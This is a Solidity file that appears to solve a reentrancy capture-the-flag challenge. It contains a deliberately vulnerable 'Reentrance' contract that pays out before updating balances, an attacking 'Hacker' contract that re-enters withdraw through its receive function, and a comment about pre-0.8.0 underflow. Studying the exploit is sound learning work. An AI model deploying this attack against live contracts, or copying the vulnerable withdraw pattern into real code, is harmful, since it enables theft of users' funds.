// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Reentrance {
  mapping(address => uint) public balances;

  constructor() public payable {}

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + (msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function getETHBal() external view returns(uint256) {
    return address(this).balance;
  }

  receive() external payable {}
}

contract Hacker {
  Reentrance public _reentrance;
  uint256 flag = 1;

  constructor(address payable reentrance_) public payable {
    _reentrance = Reentrance(reentrance_);
    _reentrance.donate{value: 1000000000000000}(address(this));
  }

  function hackk() external {
    _reentrance.withdraw(1000000000000000);
  }

  receive() external payable {
    if(flag == 1) {
      flag--;
      _reentrance.withdraw(1000000000000000);
    }
  }
}


// IMPORTANT: before 0.8.0, there were no checks for underflow/overflow due to which
// it was possible to perform such hacks, after 0.8.0. there are panic attacks which
// internally check and revert. (deploy same contract with ^0.8.0, it will revert!)
